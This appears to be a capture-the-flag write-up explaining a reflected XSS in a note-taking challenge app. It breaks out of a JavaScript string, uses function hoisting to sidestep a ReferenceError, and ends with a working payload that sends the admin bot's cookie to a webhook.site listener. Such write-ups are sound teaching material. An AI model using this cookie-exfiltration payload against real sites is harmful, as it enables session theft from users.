# TOP WEB — FahemSec Writeup
**by Mohammad**

---

## The App

A note-taking app with two input fields and a "Contact Support" button.

The button sends a URL to an admin bot. The bot visits it with a cookie called `flag`.

Goal: steal the cookie using XSS.

---

## Finding The Injection Point

I tried the obvious first:

```
<script>alert()</script>
```

Checked the source:

```
&lt;script&gt;alert()&lt;/script&gt;
```

`<` and `>` are escaped. Tag injection is dead.

But I kept looking at the source. The input is also reflected inside a JS block:

```javascript
secure.validate('remove', 'USER_INPUT');
```

I don't need angle brackets here. A single quote `'` is enough to break out.

---

## Breaking Out

I tried:

```
');alert('
```

Which gives:

```javascript
secure.validate('remove', '');alert('');
```

Opened the console:

```
Uncaught ReferenceError: secure is not defined
```

The first line throws. JavaScript stops. `alert()` never runs.

I tried commenting out the `secure.validate` call. Same error.

I tried wrapping everything in `try/catch`. Still failed.

The problem is always the same — `secure` doesn't exist on the page.

---

## The Fix — JS Hoisting

Before JavaScript runs your code, it does a first pass.

In that pass it finds all `function` declarations and moves them to the top — before anything executes.

So this works fine:

```javascript
sayHi(); // called before it's defined

function sayHi() {
    alert("hi");
}
```

`sayHi` is hoisted up before execution starts. By the time `sayHi()` is called, the function already exists.

So — what if I just declare `secure` inside my payload?

```
', alert());
function secure() {};
secure('
```

Full code becomes:

```javascript
secure.validate('remove', ''); // secure exists ✅
alert());
function secure() {};
secure('');
```

JS hoists `function secure(){}` before any of it runs. No exception. `alert()` fires.

---

## Getting The Flag

Set up a listener on [webhook.site](https://webhook.site).

Final payload:

```
', fetch("https://webhook.site/YOUR-UUID/?Flag="+document.cookie));
function secure () {};
secure('
```

URL-encoded and sent to the admin bot:

```
http://proxy/index.php?title=Test&content=http%3A%2F%2Fproxy%27%2C+fetch%28%22https%3A%2F%2Fwebhook.site%2FYOUR-UUID%2F%3FFlag%3D%22%2Bdocument.cookie%29%29%3B%0D%0Afunction+secure+%28%29+%7B%7D%3B%0D%0Asecure%28%27&category=general
```

Bot visits → XSS fires → flag lands on the webhook.

---

## Takeaway

If a `ReferenceError` is blocking your payload — you can declare the missing object yourself.

An empty `function` declaration is enough. It just needs to exist.
